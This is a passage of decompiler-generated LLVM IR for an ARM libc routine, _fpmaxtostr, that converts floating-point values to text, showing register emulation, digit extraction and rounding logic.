  uselistorder i32* %r7.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i8 45, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %dec_label_pc_16b60, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_16a98, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp151 = call i8 @__decompiler_undefined_function_2()
  %stack_var_-50 = alloca i8, align 1
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-46 = alloca i32, align 4
  %stack_var_-86 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-85 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_16ba4 = load i32, i32* @r4, align 4
  store i32 %v3_16ba4, i32* %stack_var_-36, align 4
  %v6_16ba4 = load i32, i32* @r5, align 4
  %v9_16ba4 = load i32, i32* @r6, align 4
  %v12_16ba4 = load i32, i32* @r7, align 4
  %v15_16ba4 = load i32, i32* @r8, align 4
  %v18_16ba4 = load i32, i32* @sb, align 4
  %v1_16bac = add i32 %tmp, 8
  %v2_16bac = inttoptr i32 %v1_16bac to i8*
  %v3_16bac = load i8, i8* %v2_16bac, align 1
  %v4_16bac = zext i8 %v3_16bac to i32
  store i32 %v4_16bac, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %fp.global-to-local, align 4
  %v1_16bb4 = or i32 %v4_16bac, 32
  %v2_16bb8 = ptrtoint i32* %stack_var_-184 to i32
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_16bbc = icmp ult i32 %v1_16bb4, 97
  store i1 %v6_16bbc, i1* %cpsr_n.global-to-local, align 1
  %v7_16bbc = icmp eq i32 %v1_16bb4, 97
  store i1 %v7_16bbc, i1* %cpsr_z.global-to-local, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  %v2_16bc8 = load i32, i32* %arg4, align 4
  store i32 %v2_16bc8, i32* %r8.global-to-local, align 4
  br i1 %v7_16bbc, label %bb, label %bb180

bb:                                               ; preds = %entry
  %v2_16bcc = add nuw nsw i32 %v4_16bac, 6
  store i32 %v2_16bcc, i32* %r3.global-to-local, align 4
  br label %bb180

bb180:                                            ; preds = %entry, %bb
  %v1_16be0 = phi i32 [ 101, %entry ], [ %v2_16bcc, %bb ]
  store i32 %arg2, i32* %stack_var_-192, align 4
  %v1_16bd8 = add i32 %tmp, 12
  %v2_16bd8 = inttoptr i32 %v1_16bd8 to i32*
  %v3_16bd8 = load i32, i32* %v2_16bd8, align 4
  store i32 %v3_16bd8, i32* %r2.global-to-local, align 4
  %v1_16bdc = add i32 %tmp, 4
  %v2_16bdc = inttoptr i32 %v1_16bdc to i32*
  %v3_16bdc = load i32, i32* %v2_16bdc, align 4
  store i32 %v3_16bdc, i32* %r1.global-to-local, align 4
  br i1 %v7_16bbc, label %bb181, label %bb182

bb181:                                            ; preds = %bb180
  %v2_16be0 = urem i32 %v1_16be0, 256
  store i32 %v2_16be0, i32* %r7.global-to-local, align 4
  br label %bb182

bb182:                                            ; preds = %bb180, %bb181
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_16be4 = icmp slt i32 %v2_16bc8, 0
  store i1 %v1_16be4, i1* %cpsr_n.global-to-local, align 1
  %v2_16be4 = icmp eq i32 %v2_16bc8, 0
  store i1 %v2_16be4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v1_16be4, label %bb183, label %bb184

bb183:                                            ; preds = %bb182
  store i32 6, i32* %r8.global-to-local, align 4
  br label %bb184

bb184:                                            ; preds = %bb182, %bb183
  %v1_16bf0 = and i32 %v3_16bd8, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16bf0 = icmp eq i32 %v1_16bf0, 0
  store i1 %v2_16bf0, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-50, align 1
  store i32 %arg1, i32* %stack_var_-192, align 4
  br i1 %v2_16bf0, label %dec_label_pc_16c04, label %dec_label_pc_16c74

dec_label_pc_16c04:                               ; preds = %bb184
  %v1_16c04 = urem i32 %v3_16bd8, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16c04 = icmp eq i32 %v1_16c04, 0
  store i1 %v2_16c04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16c04, label %.thread10, label %dec_label_pc_16c74

dec_label_pc_16c74:                               ; preds = %dec_label_pc_16c04, %bb184
  %storemerge = phi i8 [ 43, %bb184 ], [ 32, %dec_label_pc_16c04 ]
  store i8 %storemerge, i8* %stack_var_-50, align 1
  %v2_16c78 = add i32 %tmp, 16
  %v3_16c78 = inttoptr i32 %v2_16c78 to i32*
  store i32 32, i32* %v3_16c78, align 4
  %v0_16c80 = load i32, i32* %r7.global-to-local, align 4
  %v1_16c80 = add i32 %v0_16c80, -96
  %v3_16c80 = sub i32 95, %v0_16c80
  %v4_16c80 = and i32 %v3_16c80, %v0_16c80
  %v5_16c80 = icmp slt i32 %v4_16c80, 0
  store i1 %v5_16c80, i1* %cpsr_v.global-to-local, align 1
  %v6_16c80 = icmp slt i32 %v1_16c80, 0
  store i1 %v6_16c80, i1* %cpsr_n.global-to-local, align 1
  %v7_16c80 = icmp eq i32 %v0_16c80, 96
  store i1 %v7_16c80, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-168, align 4
  %tmp242 = icmp ult i32 %v0_16c80, 97
  br i1 %tmp242, label %bb185, label %.thread105

bb185:                                            ; preds = %dec_label_pc_16c74
  store i32 12, i32* %r3.global-to-local, align 4
  br label %.thread105

.thread105:                                       ; preds = %dec_label_pc_16c74, %bb185
  %v4_16c98 = phi i32 [ 12, %bb185 ], [ 3, %dec_label_pc_16c74 ]
  %v4_16c98..v1_16c28 = select i1 %tmp242, i32 %v4_16c98, i32 8
  store i32 ptrtoint ([4 x i8]* @global_var_24208.1269 to i32), i32* %r2.global-to-local, align 4
  %v2_16ca4 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_16ca4, i32* %r6.global-to-local, align 4
  %v2_16ca8 = add i32 %v4_16c98..v1_16c28, ptrtoint ([4 x i8]* @global_var_24208.1269 to i32)
  store i32 %v2_16ca8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1712c

.thread10:                                        ; preds = %dec_label_pc_16c04
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  %v2_16d30 = ptrtoint i32* %stack_var_-85 to i32
  store i32 %v2_16d30, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16d38

dec_label_pc_16d38:                               ; preds = %dec_label_pc_16da8, %.thread10
  %v3_16d4c = phi i32 [ %v2_16d98, %dec_label_pc_16da8 ], [ %v3_16ba4, %.thread10 ]
  %v1_16d4c = phi i1 [ %v5_16dac, %dec_label_pc_16da8 ], [ false, %.thread10 ]
  %v0_16d4c = phi i1 [ %v6_16dac, %dec_label_pc_16da8 ], [ false, %.thread10 ]
  %v2_16d4c = xor i1 %v1_16d4c, %v0_16d4c
  br i1 %v2_16d4c, label %bb187, label %bb186

bb186:                                            ; preds = %dec_label_pc_16d38
  %v4_16d4c = sub i32 0, %v3_16d4c
  store i32 %v4_16d4c, i32* %r4.global-to-local, align 4
  br label %bb187

bb187:                                            ; preds = %dec_label_pc_16d38, %bb186
  %v0_16d50 = phi i32 [ %v3_16d4c, %dec_label_pc_16d38 ], [ %v4_16d4c, %bb186 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_16d50 = icmp slt i32 %v0_16d50, 0
  store i1 %v1_16d50, i1* %cpsr_n.global-to-local, align 1
  %v2_16d50 = icmp eq i32 %v0_16d50, 0
  store i1 %v2_16d50, i1* %cpsr_z.global-to-local, align 1
  %v0_16d6c = load i32, i32* %sl.global-to-local, align 4
  %v1_16d6c = add i32 %v0_16d6c, 9
  store i32 %v1_16d6c, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16d74

dec_label_pc_16d74:                               ; preds = %dec_label_pc_16d74.dec_label_pc_16d74_crit_edge, %bb187
  %v1_16d88 = phi i32 [ %v1_16d88.pre, %dec_label_pc_16d74.dec_label_pc_16d74_crit_edge ], [ %v1_16d6c, %bb187 ]
  %v0_16d80 = phi i32 [ %v0_16d9c, %dec_label_pc_16d74.dec_label_pc_16d74_crit_edge ], [ 0, %bb187 ]
  %v0_16d8c = phi i32 [ %v2_16d98, %dec_label_pc_16d74.dec_label_pc_16d74_crit_edge ], [ %v0_16d50, %bb187 ]
  %v2_16d7c = urem i32 %v0_16d8c, 10
  %v1_16d80 = add i32 %v0_16d80, 1
  store i32 %v1_16d80, i32* %r5.global-to-local, align 4
  %v1_16d84 = or i32 %v2_16d7c, 48
  store i32 %v1_16d84, i32* %r2.global-to-local, align 4
  %v2_16d88 = sub i32 %v1_16d88, %v1_16d80
  store i32 %v2_16d88, i32* %r3.global-to-local, align 4
  store i32 %v0_16d8c, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_16d94 = trunc i32 %v1_16d84 to i8
  %v3_16d94 = inttoptr i32 %v2_16d88 to i8*
  store i8 %v1_16d94, i8* %v3_16d94, align 1
  %v0_16d98 = load i32, i32* %r0.global-to-local, align 4
  %v1_16d98 = load i32, i32* %r1.global-to-local, align 4
  %v2_16d98 = udiv i32 %v0_16d98, %v1_16d98
  store i32 %v2_16d98, i32* %r0.global-to-local, align 4
  %v0_16d9c = load i32, i32* %r5.global-to-local, align 4
  %v1_16d9c = add i32 %v0_16d9c, -8
  %v3_16d9c = sub i32 7, %v0_16d9c
  %v4_16d9c = and i32 %v3_16d9c, %v0_16d9c
  %v5_16d9c = icmp slt i32 %v4_16d9c, 0
  store i1 %v5_16d9c, i1* %cpsr_v.global-to-local, align 1
  %v6_16d9c = icmp slt i32 %v1_16d9c, 0
  store i1 %v6_16d9c, i1* %cpsr_n.global-to-local, align 1
  %v7_16d9c = icmp eq i32 %v0_16d9c, 8
  store i1 %v7_16d9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_16d98, i32* %r4.global-to-local, align 4
  %v7_16da4 = icmp slt i32 %v0_16d9c, 9
  br i1 %v7_16da4, label %dec_label_pc_16d74.dec_label_pc_16d74_crit_edge, label %dec_label_pc_16da8

dec_label_pc_16d74.dec_label_pc_16d74_crit_edge:  ; preds = %dec_label_pc_16d74
  %v1_16d88.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_16d74

dec_label_pc_16da8:                               ; preds = %dec_label_pc_16d74
  %v0_16da8 = load i32, i32* %r6.global-to-local, align 4
  %v1_16da8 = add i32 %v0_16da8, 1
  store i32 %v1_16da8, i32* %r6.global-to-local, align 4
  %v3_16dac = sub i32 -1, %v0_16da8
  %v4_16dac = and i32 %v1_16da8, %v3_16dac
  %v5_16dac = icmp slt i32 %v4_16dac, 0
  store i1 %v5_16dac, i1* %cpsr_v.global-to-local, align 1
  %v6_16dac = icmp slt i32 %v0_16da8, 0
  store i1 %v6_16dac, i1* %cpsr_n.global-to-local, align 1
  %v7_16dac = icmp eq i32 %v0_16da8, 0
  store i1 %v7_16dac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16dac, label %dec_label_pc_16d38, label %dec_label_pc_16db4

dec_label_pc_16db4:                               ; preds = %dec_label_pc_16da8
  %v0_16db4 = load i32, i32* %r7.global-to-local, align 4
  %v1_16db4 = add i32 %v0_16db4, -96
  %v3_16db4 = sub i32 95, %v0_16db4
  %v4_16db4 = and i32 %v3_16db4, %v0_16db4
  %v5_16db4 = icmp slt i32 %v4_16db4, 0
  store i1 %v5_16db4, i1* %cpsr_v.global-to-local, align 1
  %v6_16db4 = icmp slt i32 %v1_16db4, 0
  store i1 %v6_16db4, i1* %cpsr_n.global-to-local, align 1
  %v7_16db4 = icmp eq i32 %v0_16db4, 96
  store i1 %v7_16db4, i1* %cpsr_z.global-to-local, align 1
  %tmp243 = icmp ult i32 %v0_16db4, 97
  br i1 %tmp243, label %bb188, label %thread-pre-split

bb188:                                            ; preds = %dec_label_pc_16db4
  %v5_16dc0 = add i32 %v0_16db4, 32
  store i32 %v5_16dc0, i32* %r3.global-to-local, align 4
  %v5_16dc4 = urem i32 %v5_16dc0, 256
  store i32 %v5_16dc4, i32* %r7.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_16db4, %bb188
  %stack_var_-66.0108114 = phi i8 [ 69, %bb188 ], [ %tmp151, %dec_label_pc_16db4 ]
  %v0_16de4 = phi i32 [ %v5_16dc4, %bb188 ], [ %v0_16db4, %dec_label_pc_16db4 ]
  %v7_16dc8 = icmp eq i32 %v0_16de4, 103
  %.229 = zext i1 %v7_16dc8 to i32
  store i32 %.229, i32* %r3.global-to-local, align 4
  %v0_16dd4 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_16dd4 = icmp slt i32 %v0_16dd4, 0
  store i1 %v1_16dd4, i1* %cpsr_n.global-to-local, align 1
  %v2_16dd4 = icmp eq i32 %v0_16dd4, 0
  store i1 %v2_16dd4, i1* %cpsr_z.global-to-local, align 1
  %tmp191 = icmp slt i32 %v0_16dd4, 1
  br i1 %tmp191, label %.thread13, label %bb192

.thread13:                                        ; preds = %thread-pre-split
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb194

bb192:                                            ; preds = %thread-pre-split
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16ddc = icmp eq i1 %v7_16dc8, false
  store i1 %v2_16ddc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16ddc, label %bb194, label %bb193

bb193:                                            ; preds = %bb192
  %v2_16de0 = add i32 %v0_16dd4, -1
  store i32 %v2_16de0, i32* %r8.global-to-local, align 4
  br label %bb194

bb194:                                            ; preds = %.thread13, %bb192, %bb193
  %v0_16df0 = phi i32 [ %v0_16dd4, %.thread13 ], [ %v0_16dd4, %bb192 ], [ %v2_16de0, %bb193 ]
  %v1_16de4 = add i32 %v0_16de4, -102
  %v3_16de4 = sub i32 101, %v0_16de4
  %v4_16de4 = and i32 %v3_16de4, %v0_16de4
  %v5_16de4 = icmp slt i32 %v4_16de4, 0
  store i1 %v5_16de4, i1* %cpsr_v.global-to-local, align 1
  %v6_16de4 = icmp slt i32 %v1_16de4, 0
  store i1 %v6_16de4, i1* %cpsr_n.global-to-local, align 1
  %v7_16de4 = icmp eq i32 %v0_16de4, 102
  store i1 %v7_16de4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16de4, label %dec_label_pc_16df0, label %bb195

bb195:                                            ; preds = %bb194
  store i32 %v0_16df0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16e14

dec_label_pc_16df0:                               ; preds = %bb194
  %v1_16df0 = load i32, i32* %sb.global-to-local, align 4
  %v2_16df0 = add i32 %v1_16df0, %v0_16df0
  store i32 %v2_16df0, i32* %ip.global-to-local, align 4
  %v2_16df4 = add i32 %v2_16df0, 1
  %v4_16df4 = sub i32 0, %v2_16df0
  %v5_16df4 = and i32 %v2_16df4, %v4_16df4
  %v6_16df4 = icmp slt i32 %v5_16df4, 0
  store i1 %v6_16df4, i1* %cpsr_v.global-to-local, align 1
  %v7_16df4 = icmp slt i32 %v2_16df4, 0
  store i1 %v7_16df4, i1* %cpsr_n.global-to-local, align 1
  %v8_16df4 = icmp eq i32 %v2_16df4, 0
  store i1 %v8_16df4, i1* %cpsr_z.global-to-local, align 1
  %v6_16df8 = icmp slt i32 %v2_16df0, -1
  br i1 %v6_16df8, label %dec_label_pc_16dfc, label %dec_label_pc_16e14

dec_label_pc_16dfc:                               ; preds = %dec_label_pc_16df0
  %v2_16dfc = ptrtoint i32* %stack_var_-87 to i32
  store i32 %v2_16dfc, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_16e08 = bitcast i32* %stack_var_-87 to i8*
  %v3_16e08 = call i32 @__GI_memset(i8* %v2_16e08, i32 48)
  store i32 %v3_16e08, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_16e14

dec_label_pc_16e14:                               ; preds = %dec_label_pc_16df0, %bb195, %dec_label_pc_16dfc
  %v1_16e5869 = phi i32 [ %v2_16d98, %bb195 ], [ %v3_16e08, %dec_label_pc_16dfc ], [ %v2_16d98, %dec_label_pc_16df0 ]
  %v1_16e3c = phi i32 [ %v0_16df0, %bb195 ], [ -1, %dec_label_pc_16dfc ], [ %v2_16df0, %dec_label_pc_16df0 ]
  %v1_16e18 = add i32 %v1_16e3c, -16
  %v3_16e18 = sub i32 15, %v1_16e3c
  %v4_16e18 = and i32 %v3_16e18, %v1_16e3c
  %v5_16e18 = icmp slt i32 %v4_16e18, 0
  store i1 %v5_16e18, i1* %cpsr_v.global-to-local, align 1
  %v6_16e18 = icmp slt i32 %v1_16e18, 0
  store i1 %v6_16e18, i1* %cpsr_n.global-to-local, align 1
  %v7_16e18 = icmp eq i32 %v1_16e3c, 16
  store i1 %v7_16e18, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-86, align 4
  %v2_16e24 = ptrtoint i32* %stack_var_-87 to i32
  store i32 %v2_16e24, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-87, align 4
  %v7_16e2c = icmp sgt i32 %v1_16e3c, 16
  br i1 %v7_16e2c, label %.thread18, label %dec_label_pc_16e38

.thread18:                                        ; preds = %dec_label_pc_16e14
  store i32 0, i32* %r0.global-to-local, align 4
  %v10_16e30 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v10_16e30, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_16e38:                               ; preds = %dec_label_pc_16e14
  %v2_16e38 = ptrtoint i32* %stack_var_-86 to i32
  %v2_16e3c = add i32 %v1_16e3c, %v2_16e38
  store i32 %v2_16e3c, i32* %r3.global-to-local, align 4
  %v1_16e40 = add i32 %v2_16e3c, 2
  %v2_16e40 = inttoptr i32 %v1_16e40 to i8*
  %v3_16e40 = load i8, i8* %v2_16e40, align 1
  %v4_16e40 = zext i8 %v3_16e40 to i32
  store i32 %v4_16e40, i32* %r2.global-to-local, align 4
  store i32 %v1_16e40, i32* %r1.global-to-local, align 4
  %v2_16e48 = icmp ugt i8 %v3_16e40, 51
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_16e48 = icmp ult i8 %v3_16e40, 52
  store i1 %v6_16e48, i1* %cpsr_n.global-to-local, align 1
  %v7_16e48 = icmp eq i8 %v3_16e40, 52
  store i1 %v7_16e48, i1* %cpsr_z.global-to-local, align 1
  %v2_16e4c = xor i1 %v2_16e48, true
  %v3_16e4c = or i1 %v7_16e48, %v2_16e4c
  br i1 %v3_16e4c, label %bb196, label %bb197

bb196:                                            ; preds = %dec_label_pc_16e38
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb197

bb197:                                            ; preds = %dec_label_pc_16e38, %bb196
  %v1_16e5868 = phi i32 [ %v1_16e5869, %dec_label_pc_16e38 ], [ 0, %bb196 ]
  %v2_16e50 = xor i1 %v7_16e48, true
  %v3_16e50 = and i1 %v2_16e48, %v2_16e50
  br i1 %v3_16e50, label %bb198, label %.preheader

bb198:                                            ; preds = %bb197
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %.thread18, %bb197, %bb198, %.backedge
  %v1_16e58 = phi i32 [ %v1_16e58.pre, %.backedge ], [ 0, %.thread18 ], [ %v1_16e5868, %bb197 ], [ 1, %bb198 ]
  %v0_16e54 = phi i32 [ %v0_16e60, %.backedge ], [ %v10_16e30, %.thread18 ], [ %v1_16e40, %bb197 ], [ %v1_16e40, %bb198 ]
  %v1_16e54 = add i32 %v0_16e54, -1
  %v2_16e54 = inttoptr i32 %v1_16e54 to i8*
  %v3_16e54 = load i8, i8* %v2_16e54, align 1
  %v4_16e54 = zext i8 %v3_16e54 to i32
  store i32 %v1_16e54, i32* %r1.global-to-local, align 4
  %v2_16e58 = add i32 %v4_16e54, %v1_16e58
  store i32 %v2_16e58, i32* %r3.global-to-local, align 4
  %v1_16e5c = trunc i32 %v2_16e58 to i8
  store i8 %v1_16e5c, i8* %v2_16e54, align 1
  %v0_16e60 = load i32, i32* %r1.global-to-local, align 4
  %v1_16e60 = inttoptr i32 %v0_16e60 to i8*
  %v2_16e60 = load i8, i8* %v1_16e60, align 1
  %v3_16e60 = zext i8 %v2_16e60 to i32
  store i32 %v3_16e60, i32* %r2.global-to-local, align 4
  %v2_16e64 = icmp ugt i8 %v2_16e60, 56
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_16e64 = icmp ult i8 %v2_16e60, 57
  store i1 %v6_16e64, i1* %cpsr_n.global-to-local, align 1
  %v7_16e64 = icmp eq i8 %v2_16e60, 57
  store i1 %v7_16e64, i1* %cpsr_z.global-to-local, align 1
  %v2_16e68 = xor i1 %v2_16e64, true
  %v3_16e68 = or i1 %v7_16e64, %v2_16e68
  br i1 %v3_16e68, label %bb199, label %bb200

bb199:                                            ; preds = %.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb200

bb200:                                            ; preds = %.preheader, %bb199
  %v2_16e6c = xor i1 %v7_16e64, true
  %v3_16e6c = and i1 %v2_16e64, %v2_16e6c
  br i1 %v3_16e6c, label %bb201, label %._crit_edge

._crit_edge:                                      ; preds = %bb200
  %v1_16e74.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb202

bb201:                                            ; preds = %bb200
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb202

bb202:                                            ; preds = %._crit_edge, %bb201
  %v1_16e74 = phi i32 [ %v1_16e74.pre, %._crit_edge ], [ 1, %bb201 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_16e70 = icmp ult i8 %v2_16e60, 48
  store i1 %v6_16e70, i1* %cpsr_n.global-to-local, align 1
  %v7_16e70 = icmp eq i8 %v2_16e60, 48
  store i1 %v7_16e70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16e70, label %.thread20, label %bb203

.thread20:                                        ; preds = %bb202
  %v2_16e74 = or i32 %v1_16e74, 1
  store i32 %v2_16e74, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_16e7821 = icmp slt i32 %v2_16e74, 0
  store i1 %v1_16e7821, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %.backedge

bb203:                                            ; preds = %bb202
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_16e78 = icmp slt i32 %v1_16e74, 0
  store i1 %v1_16e78, i1* %cpsr_n.global-to-local, align 1
  %v2_16e78 = icmp eq i32 %v1_16e74, 0
  store i1 %v2_16e78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16e78, label %dec_label_pc_16e80, label %.backedge

.backedge:                                        ; preds = %bb203, %.thread20
  %v1_16e58.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_16e80:                               ; preds = %bb203
  store i32 %v2_16e24, i32* %r2.global-to-local, align 4
  %v2_16e84 = ptrtoint i32* %stack_var_-86 to i32
  store i32 %v2_16e84, i32* %r3.global-to-local, align 4
  %v2_16e88 = sub i32 %v0_16e60, %v2_16e84
  %v3_16e88 = icmp uge i32 %v0_16e60, %v2_16e84
  %v4_16e88 = xor i32 %v0_16e60, %v2_16e84
  %v5_16e88 = xor i32 %v2_16e88, %v0_16e60
  %v6_16e88 = and i32 %v5_16e88, %v4_16e88
  %v7_16e88 = icmp slt i32 %v6_16e88, 0
  store i1 %v7_16e88, i1* %cpsr_v.global-to-local, align 1
  %v8_16e88 = icmp slt i32 %v2_16e88, 0
  store i1 %v8_16e88, i1* %cpsr_n.global-to-local, align 1
  %v9_16e88 = icmp eq i32 %v0_16e60, %v2_16e84
  store i1 %v9_16e88, i1* %cpsr_z.global-to-local, align 1
  %v2_16e8c = xor i1 %v3_16e88, true
  %v3_16e8c = or i1 %v9_16e88, %v2_16e8c
  br i1 %v3_16e8c, label %bb204, label %.thread124

bb204:                                            ; preds = %dec_label_pc_16e80
  store i32 %v2_16e84, i32* %r2.global-to-local, align 4
  store i32 %v2_16e84, i32* %r1.global-to-local, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_16e80, %bb204
  %v2_16ea8 = phi i32 [ %v2_16e84, %bb204 ], [ %v0_16e60, %dec_label_pc_16e80 ]
  %v4_16e98123 = phi i32 [ %v2_16e84, %bb204 ], [ %v2_16e24, %dec_label_pc_16e80 ]
  %v2_16e94 = xor i1 %v9_16e88, true
  %v3_16e94 = and i1 %v3_16e88, %v2_16e94
  br i1 %v3_16e94, label %bb205, label %.thread125

bb205:                                            ; preds = %.thread124
  %v4_16e94 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v4_16e94, i32* %r0.global-to-local, align 4
  %v5_16e98 = add i32 %v4_16e98123, 2
  store i32 %v5_16e98, i32* %r2.global-to-local, align 4
  br label %.thread125

.thread125:                                       ; preds = %.thread124, %bb205
  br i1 %v3_16e8c, label %bb206, label %bb207

bb206:                                            ; preds = %.thread125
  %v4_16e9c = load i32, i32* %sb.global-to-local, align 4
  %v5_16e9c = add i32 %v4_16e9c, 1
  store i32 %v5_16e9c, i32* %r0.global-to-local, align 4
  br label %bb207

bb207:                                            ; preds = %.thread125, %bb206
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_16ea4 = load i32, i32* %r7.global-to-local, align 4
  %v1_16ea4 = add i32 %v0_16ea4, -103
  %v3_16ea4 = sub i32 102, %v0_16ea4
  %v4_16ea4 = and i32 %v3_16ea4, %v0_16ea4
  %v5_16ea4 = icmp slt i32 %v4_16ea4, 0
  store i1 %v5_16ea4, i1* %cpsr_v.global-to-local, align 1
  %v6_16ea4 = icmp slt i32 %v1_16ea4, 0
  store i1 %v6_16ea4, i1* %cpsr_n.global-to-local, align 1
  %v7_16ea4 = icmp eq i32 %v0_16ea4, 103
  store i1 %v7_16ea4, i1* %cpsr_z.global-to-local, align 1
  %v3_16ea8 = add i32 %v2_16ea8, 1
  %v4_16ea8 = inttoptr i32 %v3_16ea8 to i8*
  store i8 0, i8* %v4_16ea8, align 1
  %v0_16eac = load i32, i32* %r1.global-to-local, align 4
  %v1_16eac = add i32 %v0_16eac, 1
  store i32 %v1_16eac, i32* %r1.global-to-local, align 4
  %v0_16eb0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16eb0, label %bb208, label %dec_label_pc_16ee0

bb208:                                            ; preds = %bb207
  %v0_16eb4 = load i32, i32* %r0.global-to-local, align 4
  %v1_16eb4 = load i32, i32* %ip.global-to-local, align 4
  %not.v7_16eb8 = icmp sge i32 %v1_16eb4, %v0_16eb4
  %. = zext i1 %not.v7_16eb8 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_16ec0 = add i32 %v0_16eb4, 4
  %v4_16ec0 = sub i32 0, %v0_16eb4
  %v5_16ec0 = and i32 %v2_16ec0, %v4_16ec0
  %v6_16ec0 = icmp slt i32 %v5_16ec0, 0
  store i1 %v6_16ec0, i1* %cpsr_v.global-to-local, align 1
  %v7_16ec0 = icmp slt i32 %v2_16ec0, 0
  store i1 %v7_16ec0, i1* %cpsr_n.global-to-local, align 1
  %v8_16ec0 = icmp eq i32 %v2_16ec0, 0
